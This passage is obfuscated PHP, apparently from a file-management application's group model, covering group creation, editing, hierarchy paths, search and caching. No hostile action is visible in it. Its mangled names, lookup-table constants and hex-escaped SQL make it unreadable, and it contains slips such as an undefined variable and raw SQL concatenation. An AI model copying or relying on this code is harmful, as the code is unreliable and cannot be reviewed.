($ºÀÑ„Û‚[$…«ïÄÃÔ[521]]) { $¸—®®Â = $ºÀÑ„Û‚[$…«ïÄÃÔ[521]] . $ºÀÑ„Û‚[$…«ïÄÃÔ[1850]] . $…«ïÄÃÔ[50]; } $şóƒ–ÊÁ = array($…«ïÄÃÔ[420] => $this->groupNameAuto($„éÔ ¢ß[$…«ïÄÃÔ[432]], $„éÔ ¢ß[$…«ïÄÃÔ[32]]), $…«ïÄÃÔ[401] => $„éÔ ¢ß[$…«ïÄÃÔ[432]], $…«ïÄÃÔ[590] => $¸—®®Â, $…«ïÄÃÔ[1934] => $„éÔ ¢ß[$…«ïÄÃÔ[1837]], $…«ïÄÃÔ[1935] => 0, $…«ïÄÃÔ[1854] => 0); if (isset($„éÔ ¢ß[$…«ïÄÃÔ[1874]])) { $şóƒ–ÊÁ[$…«ïÄÃÔ[1874]] = $„éÔ ¢ß[$…«ïÄÃÔ[1874]]; } else { $¯Ø‚¯§Ş = $this->max($…«ïÄÃÔ[1874]); if (!$¯Ø‚¯§Ş) { $¯Ø‚¯§Ş = 0; } $şóƒ–ÊÁ[$…«ïÄÃÔ[1874]] = $¯Ø‚¯§Ş + 1; } if (!empty($„éÔ ¢ß[$…«ïÄÃÔ[1850]])) { $şóƒ–ÊÁ[$…«ïÄÃÔ[1850]] = $„éÔ ¢ß[$…«ïÄÃÔ[1850]]; } $ß³ô›Ûè = $this->add($şóƒ–ÊÁ); $this->setNamePinyin($ß³ô›Ûè, $şóƒ–ÊÁ[$…«ïÄÃÔ[32]]); if (isset($„éÔ ¢ß[$…«ïÄÃÔ[1936]])) { $this->metaSet($ß³ô›Ûè, array($…«ïÄÃÔ[1936] => $„éÔ ¢ß[$…«ïÄÃÔ[1936]], $…«ïÄÃÔ[1937] => $„éÔ ¢ß[$…«ïÄÃÔ[1937]])); unset($„éÔ ¢ß[$…«ïÄÃÔ[1936]]); unset($„éÔ ¢ß[$…«ïÄÃÔ[1937]]); } Model($…«ïÄÃÔ[1349])->groupRootAdd($ß³ô›Ûè); return $ß³ô›Ûè; } protected function groupEdit($Â‰íŸ°î, $Šğ¡) { $Ñğ•”Ê© =& $_SERVER[ä¿÷‹µ±]; $À¾“ƒ… = $this->getInfoSimple($Â‰íŸ°î); if (!$À¾“ƒ…) { return !1; } if (!empty($Šğ¡[$Ñğ•”Ê©[432]])) { $Êè”Åë = $this->getInfoSimple($Šğ¡[$Ñğ•”Ê©[432]]); if (!$Êè”Åë) { return !1; } if ($À¾“ƒ…[$Ñğ•”Ê©[1850]] == $Êè”Åë[$Ñğ•”Ê©[1850]]) { return !1; } if ($Šğ¡[$Ñğ•”Ê©[432]] != $À¾“ƒ…[$Ñğ•”Ê©[432]]) { if ($Êè”Åë[$Ñğ•”Ê©[521]] !== $À¾“ƒ…[$Ñğ•”Ê©[521]] && strpos($Êè”Åë[$Ñğ•”Ê©[521]], $À¾“ƒ…[$Ñğ•”Ê©[521]] . $À¾“ƒ…[$Ñğ•”Ê©[1850]] . $Ñğ•”Ê©[50]) === 0) { return !1; } $Šğ¡[$Ñğ•”Ê©[590]] = $Êè”Åë[$Ñğ•”Ê©[521]] . $Šğ¡[$Ñğ•”Ê©[432]] . $Ñğ•”Ê©[50]; $this->_changeChildLevel($À¾“ƒ…, $Êè”Åë); } } if (isset($Šğ¡[$Ñğ•”Ê©[32]])) { $this->setNamePinyin($Â‰íŸ°î, $Šğ¡[$Ñğ•”Ê©[32]]); } if (isset($Šğ¡[$Ñğ•”Ê©[1936]])) { $this->metaSet($Â‰íŸ°î, array($Ñğ•”Ê©[1936] => $Šğ¡[$Ñğ•”Ê©[1936]], $Ñğ•”Ê©[1937] => $Šğ¡[$Ñğ•”Ê©[1937]])); unset($Šğ¡[$Ñğ•”Ê©[1936]]); unset($Šğ¡[$Ñğ•”Ê©[1937]]); } $this->_clearChildrenCache($À¾“ƒ…); return $this->where(array($Ñğ•”Ê©[1938] => $Â‰íŸ°î))->save($Šğ¡); } private function _clearChildrenCache($Éóşá²) { $Îßë«éÇ =& $_SERVER[ä¿÷‹µ±]; $¢ıç«ëò = array($Îßë«éÇ[590] => array($Îßë«éÇ[550], $Éóşá²[$Îßë«éÇ[521]] . $Éóşá²[$Îßë«éÇ[1850]] . $Îßë«éÇ[551])); $×š”ØÁĞ = $this->field($Îßë«éÇ[1850])->where($¢ıç«ëò)->select(); foreach ($×š”ØÁĞ as $¹¶·É¤Ì) { $this->_clearCache($¹¶·É¤Ì[$Îßë«éÇ[1850]]); } } private function _clearCache($¨ò©Ç™) { $Àş‚æ¢ =& $_SERVER[ä¿÷‹µ±]; $this->cacheFunctionClear($Àş‚æ¢[1932], $¨ò©Ç™); $this->cacheFunctionClear($Àş‚æ¢[1933], $¨ò©Ç™); } private function _changeChildLevel($øøÓ€, $½‡¾Œëó, $ø­™ÙÙ = false) { $ä®·è¬¦ =& $_SERVER[ä¿÷‹µ±]; $¹’Ü°Ñã = $øøÓ€[$ä®·è¬¦[521]] . $øøÓ€[$ä®·è¬¦[1850]] . $ä®·è¬¦[50]; $šÎÄã—ë = $½‡¾Œëó[$ä®·è¬¦[521]] . $½‡¾Œëó[$ä®·è¬¦[1850]] . $ä®·è¬¦[50] . $øøÓ€[$ä®·è¬¦[1850]] . $ä®·è¬¦[50]; if ($ø­™ÙÙ) { $šÎÄã—ë = $½‡¾Œëó[$ä®·è¬¦[521]] . $½‡¾Œëó[$ä®·è¬¦[1850]] . $ä®·è¬¦[50]; } $»º½èß = array($ä®·è¬¦[590] => array($ä®·è¬¦[550], $øøÓ€[$ä®·è¬¦[521]] . $øøÓ€[$ä®·è¬¦[1850]] . $ä®·è¬¦[551])); $ìŸ ÄÒ = array($ä®·è¬¦[590] => array($ä®·è¬¦[599], "\x72\x65\160\x6c\141\x63\145\50\x70\x61\x72\x65\x6e\164\x4c\145\166\145\x6c\54\47{$¹’Ü°Ñã}\47\54\47{$šÎÄã—ë}\x27\51")); $this->_clearChildrenCache($øøÓ€); $this->where($»º½èß)->data($ìŸ ÄÒ)->save(); } public function setNamePinyin($£ëĞî÷ô, $Ó‘˜œ¸µ = false) { $Š«ÉÇùİ =& $_SERVER[ä¿÷‹µ±]; if (!$Ó‘˜œ¸µ) { $é¡¯å¨“ = $this->getInfoSimple($£ëĞî÷ô); $Ó‘˜œ¸µ = $é¡¯å¨“[$Š«ÉÇùİ[32]]; } if (!Input::check($Ó‘˜œ¸µ, $Š«ÉÇùİ[593])) { $this->metaSet($£ëĞî÷ô, $Š«ÉÇùİ[465], null); $this->metaSet($£ëĞî÷ô, $Š«ÉÇùİ[464], null); return; } $ì®éÓÇ = array($Š«ÉÇùİ[465] => str_replace($Š«ÉÇùİ[53], $Š«ÉÇùİ[12], Pinyin::get($Ó‘˜œ¸µ)), $Š«ÉÇùİ[464] => Pinyin::get($Ó‘˜œ¸µ, $Š«ÉÇùİ[594])); $this->metaSet($£ëĞî÷ô, $ì®éÓÇ); } protected function groupStatus($ôÒé², $›äÒ«ŞÉ) { $æ’ûñôÇ =& $_SERVER[ä¿÷‹µ±]; $ò°¶ÉÓê = $this->getInfoSimple($ôÒé²); if (!$ò°¶ÉÓê) { return !1; } if ($›äÒ«ŞÉ == $æ’ûñôÇ[88]) { $ˆè¿–ñ = $this->parentLevelArray($ò°¶ÉÓê[$æ’ûñôÇ[521]]); } else { $Ş¦Ó¶”ê = array($æ’ûñôÇ[590] => array($æ’ûñôÇ[550], $ò°¶ÉÓê[$æ’ûñôÇ[521]] . $ò°¶ÉÓê[$æ’ûñôÇ[1850]] . $æ’ûñôÇ[551])); $ˆè¿–ñ = $this->where($Ş¦Ó¶”ê)->field($æ’ûñôÇ[1850])->select(); $ˆè¿–ñ = array_to_keyvalue($ˆè¿–ñ, $æ’ûñôÇ[12], $æ’ûñôÇ[1850]); } $ˆè¿–ñ[] = $ò°¶ÉÓê[$æ’ûñôÇ[1850]]; $½ŒíÁÆË = array(); foreach ($ˆè¿–ñ as $ôÒé²) { $½ŒíÁÆË[] = array($æ’ûñôÇ[1850] => $ôÒé², $æ’ûñôÇ[94] => $æ’ûñôÇ[769], $æ’ûñôÇ[374] => $›äÒ«ŞÉ); $this->_clearCache($ôÒé²); } return Model($æ’ûñôÇ[1939])->addAll($½ŒíÁÆË, array(), !0); } protected function groupRemove($Öú…ºÎÃ, $èÃÁƒ‹¼ = false) { $ßî¼ĞŞ¤ =& $_SERVER[ä¿÷‹µ±]; $¬ËáâÚ­ = array($ßî¼ĞŞ¤[1850] => $Öú…ºÎÃ); $¯Ó¸Î·Õ = $this->where($¬ËáâÚ­)->find(); if (!$¯Ó¸Î·Õ || $¯Ó¸Î·Õ[$ßî¼ĞŞ¤[432]] == 0) { return !1; } if (!$èÃÁƒ‹¼) { $¢òç‰¶˜ = $this->getInfoSimple($¯Ó¸Î·Õ[$ßî¼ĞŞ¤[432]]); $this->_changeChildLevel($¯Ó¸Î·Õ, $¢òç‰¶˜, !0); $this->where(array($ßî¼ĞŞ¤[432] => $Öú…ºÎÃ))->save(array($ßî¼ĞŞ¤[432] => $¯Ó¸Î·Õ[$ßî¼ĞŞ¤[432]])); } Model($ßî¼ĞŞ¤[1939])->where($¬ËáâÚ­)->delete(); Model($ßî¼ĞŞ¤[1940])->where($¬ËáâÚ­)->delete(); Model($ßî¼ĞŞ¤[844])->groupRootRemove($Öú…ºÎÃ); return $this->where($¬ËáâÚ­)->delete(); } protected function groupSort($ê²ä®’Ç) { $ì‡š§Ğ =& $_SERVER[ä¿÷‹µ±]; $Õë¬Ü = array(); foreach ($ê²ä®’Ç as $¨ËÙÔõÎ => $şİ¢Áı) { $Õë¬Ü[] = array($ì‡š§Ğ[1850], $şİ¢Áı, $ì‡š§Ğ[1874], $¨ËÙÔõÎ + 1); } $this->saveAll($Õë¬Ü); } public function listData() { $Ø€˜¹îÃ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($Ø€˜¹îÃ[$_SERVER[ä¿÷‹µ±][369]]); return $Ø€˜¹îÃ; } private function _makeOrder($ÖÕì£ò¶ = '') { $²ƒ·×¤Á =& $_SERVER[ä¿÷‹µ±]; $ŒúÁñÖ´ = array($²ƒ·×¤Á[1850], $²ƒ·×¤Á[32], $²ƒ·×¤Á[1839], $²ƒ·×¤Á[200]); $¿±¶­¥’ = array($²ƒ·×¤Á[450] => $²ƒ·×¤Á[451], $²ƒ·×¤Á[452] => $²ƒ·×¤Á[453]); $ûÜä½Ú– = Input::get($²ƒ·×¤Á[457], $²ƒ·×¤Á[7], $²ƒ·×¤Á[1854], $ŒúÁñÖ´); $ ¼ïõø = Input::get($²ƒ·×¤Á[458], $²ƒ·×¤Á[7], $²ƒ·×¤Á[1941], array($²ƒ·×¤Á[1941], $²ƒ·×¤Á[452])); $ ¼ïõø = $¿±¶­¥’[$ ¼ïõø]; $ÖÕì£ò¶ = $ÖÕì£ò¶ . "{$ûÜä½Ú–}\x20{$ ¼ïõø}\x2c\40\147\162\157\165\x70\x49\104\40\x61\x73\x63"; return $this->order($ÖÕì£ò¶); } public function listChild($ïîõÇ…Û) { $è“Ê›Äª =& $_SERVER[ä¿÷‹µ±]; $æ’Ü˜® = $this->where(array($è“Ê›Äª[432] => $ïîõÇ…Û))->_makeOrder()->selectPage(200); $this->_listDataApply($æ’Ü˜®[$è“Ê›Äª[369]]); return $æ’Ü˜®; } public function listChildIds($„¼ø¿Äƒ) { $Ãœ÷¸ÃĞ =& $_SERVER[ä¿÷‹µ±]; if (is_string($“Åõı¶)) { $„¼ø¿Äƒ = explode($Ãœ÷¸ÃĞ[50], $„¼ø¿Äƒ); } $Æ·ì·şƒ = $this->where(array($Ãœ÷¸ÃĞ[1850] => array($Ãœ÷¸ÃĞ[7], $„¼ø¿Äƒ)))->field($Ãœ÷¸ÃĞ[1942])->select(); if (!$Æ·ì·şƒ) { return !1; } $¤Ì¨‰½‹ = array(); foreach ($Æ·ì·şƒ as $¬³ö‚¯Ó) { $¤Ì¨‰½‹[] = "\x73\145\154\x65\x63\164\40\x67\x72\x6f\x75\160\x49\104\x20\x66\x72\157\x6d\40\140\147\162\157\165\x70\140\40\x77\150\145\x72\x65\x20\160\141\162\x65\156\164\114\145\166\145\154\x20\154\x69\x6b\x65\x20\x27{$¬³ö‚¯Ó[$Ãœ÷¸ÃĞ[521]]}{$¬³ö‚¯Ó[$Ãœ÷¸ÃĞ[1850]]}\54\x25\47"; } $¤Ì¨‰½‹ = implode($Ãœ÷¸ÃĞ[1943], $¤Ì¨‰½‹); $Æ·ì·şƒ = $this->query($¤Ì¨‰½‹); if (!$Æ·ì·şƒ) { return array(); } $„¼ø¿Äƒ = array_to_keyvalue($Æ·ì·şƒ, $Ãœ÷¸ÃĞ[12], $Ãœ÷¸ÃĞ[1850]); return array_unique($„¼ø¿Äƒ); } public function listByID($æÇØÓ¦Ì) { $¼ÇìâØ =& $_SERVER[ä¿÷‹µ±]; if (!$æÇØÓ¦Ì) { return array(); } $´¡†Íû• = array($¼ÇìâØ[1850] => array($¼ÇìâØ[7], $æÇØÓ¦Ì)); $“ö›¿¸Æ = $this->where($´¡†Íû•)->select(); $“ö›¿¸Æ = array_sort_keep($“ö›¿¸Æ, $¼ÇìâØ[1850], $æÇØÓ¦Ì); $this->_listDataApply($“ö›¿¸Æ); return $“ö›¿¸Æ; } public function listSearch($ğ©óØµ×) { $êÒÅŞÍó =& $_SERVER[ä¿÷‹µ±]; $·¡‚™ùë = $ğ©óØµ×[$êÒÅŞÍó[1944]]; $¡è¥¯İÉ = isset($ğ©óØµ×[$êÒÅŞÍó[1945]]) ? $ğ©óØµ×[$êÒÅŞÍó[1945]] : !1; if (!trim($·¡‚™ùë)) { return !1; } $·¡‚™ùë = str_replace($êÒÅŞÍó[1946], $êÒÅŞÍó[1947], $·¡‚™ùë); $ÃÓèÃ¶É = array($êÒÅŞÍó[1850] => array($êÒÅŞÍó[383], "{$·¡‚™ùë}\x25"), $êÒÅŞÍó[32] => array($êÒÅŞÍó[383], "\x25{$·¡‚™ùë}\x25"), $êÒÅŞÍó[1022] => $êÒÅŞÍó[1948]); if ($¡è¥¯İÉ) { $šâıÊ¿‡ = $this->getInfoSimple($¡è¥¯İÉ); $Ì¾ÚË‡ = $šâıÊ¿‡[$êÒÅŞÍó[521]] . $¡è¥¯İÉ . $êÒÅŞÍó[551]; $ÃÓèÃ¶É = array($ÃÓèÃ¶É, array($êÒÅŞÍó[521] => array($êÒÅŞÍó[383], $Ì¾ÚË‡))); } $ÃÓèÃ¶É = $this->parseWhereLike($ÃÓèÃ¶É); $û‰çÜ‰¡ = $this->_makeOrder()->where($ÃÓèÃ¶É)->selectPage(20); $û‰çÜ‰¡ = $û‰çÜ‰¡ ? $û‰çÜ‰¡ : array($êÒÅŞÍó[369] => array(), $êÒÅŞÍó[366] => array()); if (!$û‰çÜ‰¡ || count($û‰çÜ‰¡[$êÒÅŞÍó[369]]) < 5 && Input::check($·¡‚™ùë, $êÒÅŞÍó[318])) { $ğƒíëå­ = $this->groupChildrenAll($¡è¥¯İÉ); $•¿“‹óƒ = $this->_searchFromMeta($êÒÅŞÍó[464], $·¡‚™ùë, 10, $ğƒíëå­); $“Ş¥ëÁı = $this->_searchFromMeta($êÒÅŞÍó[465], $·¡‚™ùë, 10, $ğƒíëå­); $„©Áâ = array_merge($•¿“‹óƒ, $“Ş¥ëÁı, $û‰çÜ‰¡[$êÒÅŞÍó[369]]); $û‰çÜ‰¡[$êÒÅŞÍó[369]] = array_unique_by_key($„©Áâ, $êÒÅŞÍó[1850]); $û‰çÜ‰¡[$êÒÅŞÍó[366]][$êÒÅŞÍó[367]] = count($û‰çÜ‰¡[$êÒÅŞÍó[369]]); $û‰çÜ‰¡[$êÒÅŞÍó[366]][$êÒÅŞÍó[368]] = ceil($û‰çÜ‰¡[$êÒÅŞÍó[366]][$êÒÅŞÍó[367]] / $û‰çÜ‰¡[$êÒÅŞÍó[366]][$êÒÅŞÍó[363]]); } $this->_listDataApply($û‰çÜ‰¡[$êÒÅŞÍó[369]]); return $û‰çÜ‰¡; } protected function groupChildrenAll($”äğŒ¿ñ) { $ƒÉ¸˜û =& $_SERVER[ä¿÷‹µ±]; if (!$”äğŒ¿ñ) { return !1; } if (is_string($”äğŒ¿ñ)) { $”äğŒ¿ñ = array($”äğŒ¿ñ); } $Ò‹İ¾öğ = $”äğŒ¿ñ; foreach ($”äğŒ¿ñ as $Ä€ÀÙû„) { $Œ“Â„´Š = $this->getInfoSimple($Ä€ÀÙû„); $æ£·¦ = array($ƒÉ¸˜û[521] => array($ƒÉ¸˜û[383], $Œ“Â„´Š[$ƒÉ¸˜û[521]] . $Ä€ÀÙû„ . $ƒÉ¸˜û[551])); $ÄÏğÆËß = $this->field($ƒÉ¸˜û[1850])->where($æ£·¦)->select(); $Ò‹İ¾öğ = array_merge($Ò‹İ¾öğ, array_to_keyvalue($ÄÏğÆËß, $ƒÉ¸˜û[12], $ƒÉ¸˜û[1850])); } return array_unique($Ò‹İ¾öğ); } private function _searchFromMeta($ƒ£ÓÚ¦, $È”³İÁ†, $ïˆêë‹, $¥…É†) { $–áÄ¹Âä =& $_SERVER[ä¿÷‹µ±]; $È”³İÁ† = strtolower($È”³İÁ†); $Õ†ôŞ = array($–áÄ¹Âä[94] => $ƒ£ÓÚ¦, $–áÄ¹Âä[374] => array($–áÄ¹Âä[383], "\45{$È”³İÁ†}\45")); $Õ†ôŞ = $this->parseWhereLike($Õ†ôŞ); if ($¥…É†) { $Õ†ôŞ[$–áÄ¹Âä[1850]] = array($–áÄ¹Âä[7], $¥…É†); } $İËöŠØ† = Model($–áÄ¹Âä[1949])->where($Õ†ôŞ)->limit($ïˆêë‹)->select(); if (!$İËöŠØ†) { return array(); } $İËöŠØ† = array_to_keyvalue($İËöŠØ†, $–áÄ¹Âä[12], $–áÄ¹Âä[1850]); $‰—§‘á­ = $this->where(array($–áÄ¹Âä[1938] => array($–áÄ¹Âä[7], $İËöŠØ†)))->select(); if (!$‰—§‘á­) { return array(); } return $‰—§‘á­; } protected function _listDataApplyItem($òÑæ¶¤£) { $êìæ·Ää = array($òÑæ¶¤£); $this->_listDataApply($êìæ·Ää); return $êìæ·Ää[0]; } protected function _listDataApply(&$‹­‚òÍë) { $üüãßËî =& $_SERVER[ä¿÷‹µ±]; if (!$‹­‚òÍë) { return; } $é°±ØÕ = array_to_keyvalue($‹­‚òÍë, $üüãßËî[12], $üüãßËî[1850]); $this->_listAppendChildren($‹­‚òÍë); $this->_listAppendChildrenMember($‹­‚òÍë); $this->_listAppendMeta($‹­‚òÍë, $é°±ØÕ); $this->_listAppendParent($‹­‚òÍë); $this->_listAppendSourceRoot($‹­‚òÍë, $é°±ØÕ); } private function _listAppendChildren(&$¬¥øÀ¥×) { $ ­›ĞËº =& $_SERVER[ä¿÷‹µ±]; $¾±ÆëİÅ = array_to_keyvalue($¬¥øÀ¥×, $ ­›ĞËº[12], $ ­›ĞËº[1850]); $ ¹ç¬®ï = array($ ­›ĞËº[432] => array($ ­›ĞËº[7], $¾±ÆëİÅ)); $îİüª‚ = array($ ­›ĞËº[432], $ ­›ĞËº[1950] => $ ­›ĞËº[500]); $ã¡§ÕŸ† = $this->field($îİüª‚)->where($ ¹ç¬®ï)->group($ ­›ĞËº[432])->select(); $¾ßŞšãî = array_to_keyvalue($ã¡§ÕŸ†, $ ­›ĞËº[432], $ ­›ĞËº[500]); foreach ($¬¥øÀ¥× as &$²¾÷ä¼¸) { $šß‹±ì = $²¾÷ä¼¸[$ ­›ĞËº[1850]]; $²¾÷ä¼¸[$ ­›ĞËº[1951]] = isset($¾ßŞšãî[$šß‹±ì]) ? intval($¾ßŞšãî[$šß‹±ì]) : !1; } unset($²¾÷ä¼¸); } private function _listAppendChildrenMember(&$âöúİüŒ) { $¢“˜é“ =& $_SERVER[ä¿÷‹µ±]; $ú’’¥Ùò = array_to_keyvalue($âöúİüŒ, $¢“˜é“[12], $¢“˜é“[1850]); $›İŠ‚® = array($¢“˜é“[1850] => array($¢“˜é“[7], $ú’’¥Ùò)); $—Á•Õ„‡ = array($¢“˜é“[1850], $¢“˜é“[1950] => $¢“˜é“[500]); $ôœ»“”ª = Model($¢“˜é“[1940])->field($—Á•Õ„‡)->where($›İŠ‚®)->group($¢“˜é“[1850])->select(); $©« ¼Ø» = array_to_keyvalue($ôœ»“”ª, $¢“˜é“[1850], $¢“˜é“[500]); foreach ($âöúİüŒ as &$ó×›Š½Ú) { $ÃûÍĞƒç = $ó×›Š½Ú[$¢“˜é“[1850]]; $ó×›Š½Ú[$¢“˜é“[1952]] = isset($©« ¼Ø»[$ÃûÍĞƒç]) ? intval($©« ¼Ø»[$ÃûÍĞƒç]) : !1; } unset($ó×›Š½Ú); } private function _listAppendMeta(&$Æ„ ß»², $üğòÌ¢×) { $Åİş‘ï =& $_SERVER[ä¿÷‹µ±]; $Œš²äîã = array($Åİş‘ï[1850] => array($Åİş‘ï[7], $üğòÌ¢×)); $†¢ÅØ¢ = Model($Åİş‘ï[1939])->where($Œš²äîã)->select(); $†¢ÅØ¢ = array_to_keyvalue_group($†¢ÅØ¢, $Åİş‘ï[1850]); foreach ($†¢ÅØ¢ as &$ƒıÎµ“Ù) { $ƒıÎµ“Ù = array_to_keyvalue($ƒıÎµ“Ù, $Åİş‘ï[94], $Åİş‘ï[374]); } unset($ƒıÎµ“Ù); foreach ($Æ„ ß»² as &$Ú´ÉìË) { $Ú´ÉìË[$Åİş‘ï[466]] = array(); if (isset($†¢ÅØ¢[$Ú´ÉìË[$Åİş‘ï[1850]]])) { $Ú´ÉìË[$Åİş‘ï[466]] = $†¢ÅØ¢[$Ú´ÉìË[$Åİş‘ï[1850]]]; } } unset($Ú´ÉìË); } protected function parentLevelArray($¥á®¤´) { $´Îùˆº­ =& $_SERVER[ä¿÷‹µ±]; $¥á®¤´ = explode($´Îùˆº­[50], trim($¥á®¤´, $´Îùˆº­[50])); $¥á®¤´ = array_remove_value($¥á®¤´, $´Îùˆº­[197]); return $¥á®¤´; } protected function parentInGroup($Œ‰÷ÄÌ¬, $Ò¢°Ò®¿) { $‹‘˜ùí =& $_SERVER[ä¿÷‹µ±]; $£¶¾ êä = $this->getInfoSimple($Œ‰÷ÄÌ¬); if (!$£¶¾ êä) { return !0; } $¶øØÉï = $this->parentLevelArray($£¶¾ êä[$‹‘˜ùí[521]]); $¶øØÉï[] = $Œ‰÷ÄÌ¬; foreach ($¶øØÉï as $Œ‰÷ÄÌ¬) { if (in_array($Œ‰÷ÄÌ¬ . $‹‘˜ùí[12], $Ò¢°Ò®¿)) { return !0; } } return !1; } private function _listAppendParent(&$°ê¨ÒŠ) { $İŠ‹¢€ü =& $_SERVER[ä¿÷‹µ±]; $Õùè»Œ = array(); foreach ($°ê¨ÒŠ as &$ÚˆãÀÈÊ) { $Õùè»Œ[$ÚˆãÀÈÊ[$İŠ‹¢€ü[1850]]] = $ÚˆãÀÈÊ[$İŠ‹¢€ü[32]]; $âµ½— = $this->parentLevelArray($ÚˆãÀÈÊ[$İŠ‹¢€ü[521]]); foreach ($âµ½— as $”ï¬ãÚ») { if (!isset($Õùè»Œ[$”ï¬ãÚ»])) { $Õùè»Œ[$”ï¬ãÚ»] = 0; } } } unset($ÚˆãÀÈÊ); foreach ($Õùè»Œ as $Ï¨ÇÉÎİ => $ã ²ƒ‹Ò) { if ($ã ²ƒ‹Ò) { continue; } $Æ×‰¹ = $this->getInfoSimple($Ï¨ÇÉÎİ); $Õùè»Œ[$Ï¨ÇÉÎİ] = $Æ×‰¹[$İŠ‹¢€ü[32]]; } $Äş§ùÚ = $GLOBALS[$İŠ‹¢€ü[6]][$İŠ‹¢€ü[89]][$İŠ‹¢€ü[1953]]; if ($GLOBALS[$İŠ‹¢€ü[503]] == $İŠ‹¢€ü[88]) { $Äş§ùÚ = !1; } foreach ($°ê¨ÒŠ as &$ÚˆãÀÈÊ) { $âµ½— = $this->parentLevelArray($ÚˆãÀÈÊ[$İŠ‹¢€ü[521]]); $Ó±ÏÍ¾ù = $İŠ‹¢€ü[12]; foreach ($âµ½— as $Ï¨ÇÉÎİ => $”ï¬ãÚ») { if ($Äş§ùÚ && $Ï¨ÇÉÎİ == 0) { continue; } $Ó±ÏÍ¾ù .= $Õùè»Œ[$”ï¬ãÚ»] . $İŠ‹¢€ü[8]; } if ($âµ½—) { $Ó±ÏÍ¾ù .= $ÚˆãÀÈÊ[$İŠ‹¢€ü[32]]; } $ÚˆãÀÈÊ[$İŠ‹¢€ü[526]] = str_replace($İŠ‹¢€ü[529], $İŠ‹¢€ü[8], $Ó±ÏÍ¾ù); } unset($ÚˆãÀÈÊ); } private function _listAppendSourceRoot(&$É¼Ú¿îÛ, $¯ş›§í) { $ÂæğÇ =& $_SERVER[ä¿÷‹µ±]; $È·““¦— = Model($ÂæğÇ[844])->listSourceRoot(SourceModel::TYPE_GROUP, $¯ş›§í); $È·““¦— = array_to_keyvalue($È·““¦—, $ÂæğÇ[505]); $È·““¦— = array_remove_key($È·““¦—, $ÂæğÇ[505]); foreach ($É¼Ú¿îÛ as &$©üÎá) { $©üÎá[$ÂæğÇ[86]] = $È·““¦—[$©üÎá[$ÂæğÇ[1850]]] ? $È·““¦—[$©üÎá[$ÂæğÇ[1850]]] : array(); } unset($©üÎá); } protected function groupMerge($ò¾¿‡¡ı) { $ò¾¿‡¡ı = array_values(array_unique($ò¾¿‡¡ı)); $†ò Æ§¹ = array(); for ($“ÖÈƒ¯Ë = 0; $“ÖÈƒ¯Ë < count($ò¾¿‡¡ı); $“ÖÈƒ¯Ë++) { $–š“å¾Á = !1; for ($å³öÚÏÚ = 0; $å³öÚÏÚ < count($ò¾¿‡¡ı); $å³öÚÏÚ++) { if ($“ÖÈƒ¯Ë == $å³öÚÏÚ) { continue; } if ($this->isParentOf($ò¾¿‡¡ı[$å³öÚÏÚ], $ò¾¿‡¡ı[$“ÖÈƒ¯Ë])) { $–š“å¾Á = !0; break; } } if (!$–š“å¾Á) { $†ò Æ§¹[] = $ò¾¿‡¡ı[$“ÖÈƒ¯Ë]; } } return $†ò Æ§¹; } protected function isParentOf($ïš©Åşš, $Å£’åéñ) { $ Ì›ŒÍè =& $_SERVER[ä¿÷‹µ±]; if (!$ïš©Åşš || !$Å£’åéñ || $ïš©Åşš == $Å£’åéñ) { return !1; } $ç½²‹ïä = $this->getInfoSimple($ïš©Åşš); $É‚£‚¡ = $this->getInfoSimple($Å£’åéñ); $ÅÍ°®‘á = $ç½²‹ïä[$ Ì›ŒÍè[521]] . $ïš©Åşš . $ Ì›ŒÍè[50]; if (substr($É‚£‚¡[$ Ì›ŒÍè[521]], 0, strlen($ÅÍ°®‘á)) == $ÅÍ°®‘á) { return !0; } return !1; } public function groupShowRoot($òÎ˜òúô, $ù»ñ¢ = false) { $†…¯ü·ó =& $_SERVER[ä¿÷‹µ±]; $ ©Â‘½­ = $this->getInfo($òÎ˜òúô); if (!$ ©Â‘½­) { return array(); } $ıìÁ¨º¡ = $this->parentLevelArray($ ©Â‘½­[$†…¯ü·ó[521]]); $›ªŠÜ±³ = array($òÎ˜òúô); if (count($ıìÁ¨º¡) == 0) { return $›ªŠÜ±³; } if ($ù»ñ¢ && count($ıìÁ¨º¡) == 1) { return $›ªŠÜ±³; } if (!$ ©Â‘½­[$†…¯ü·ó[466]] || !isset($ ©Â‘½­[$†…¯ü·ó[466]][$†…¯ü·ó[1936]]) || $ ©Â‘½­[$†…¯ü·ó[466]][$†…¯ü·ó[1936]] == $†…¯ü·ó[1905]) { return $this->groupShowRoot($ıìÁ¨º¡[count($ıìÁ¨º¡) - 1], $ù»ñ¢); } if ($ ©Â‘½­[$†…¯ü·ó[466]][$†…¯ü·ó[1936]] == $†…¯ü·ó[357]) { $İàÊÃ®ç = explode($†…¯ü·ó[50], $ ©Â‘½­[$†…¯ü·ó[466]][$†…¯ü·ó[1937]]); if ($İàÊÃ®ç) { $›ªŠÜ±³ = array_merge($›ªŠÜ±³, $İàÊÃ®ç); } } return $›ªŠÜ±³; } protected function resetParentLevel() { $¢éşÌ˜¿ =& $_SERVER[ä¿÷‹µ±]; $ã€â¶ = $¢éşÌ˜¿[1850]; $ô€è© = $this->select(); $ô€è© = array_to_keyvalue($ô€è©, $ã€â¶); foreach ($ô€è© as $ÒÓ‘Ôìš) { $äá³óğ´ = $ÒÓ‘Ôìš; $—¬Ô÷Æõ = array(); while ($äá³óğ´[$¢éşÌ˜¿[432]] != 0) { $—¬Ô÷Æõ[] = $äá³óğ´[$¢éşÌ˜¿[432]]; $äá³óğ´ = $ô€è©[$äá³óğ´[$¢éşÌ˜¿[432]]]; } $—¬Ô÷Æõ[] = 0; $—¬Ô÷Æõ = $¢éşÌ˜¿[50] . implode($¢éşÌ˜¿[50], array_reverse($—¬Ô÷Æõ)) . $¢éşÌ˜¿[50]; $this->setNamePinyin($ÒÓ‘Ôìš[$ã€â¶], $ÒÓ‘Ôìš[$¢éşÌ˜¿[32]]); $this->where(array($ã€â¶ => $ÒÓ‘Ôìš[$ã€â¶]))->save(array($¢éşÌ˜¿[590] => $—¬Ô÷Æõ)); } return $ô€è©; } public function groupNameAuto($ÓÀƒÇ˜„, $ÅˆÆ·è½) { $î®ÜÊìğ =& $_SERVER[ä¿÷‹µ±]; $Åæ·Æ‚ = $this->where(array($î®ÜÊìğ[401] => $ÓÀƒÇ˜„))->getField($î®ÜÊìğ[32], !0); if (!$Åæ·Æ‚ || !in_array($ÅˆÆ·è½, $Åæ·Æ‚)) { return $ÅˆÆ·è½; } for ($ûÑÍšòö = 1; $ûÑÍšòö <= count($Åæ·Æ‚) + 1; $ûÑÍšòö++) { $Ş¸±æÀ‡ = $ÅˆÆ·è½ . 